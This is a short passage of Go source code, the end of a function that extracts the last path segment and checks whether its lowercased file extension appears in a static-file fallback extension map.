	if i := strings.LastIndexByte(base, '/'); i >= 0 {
		base = base[i+1:]
	}
	if base == "" || !strings.Contains(base, ".") {
		return false
	}
	return staticFallbackExts[strings.ToLower(base[strings.LastIndexByte(base, '.'):])]
}
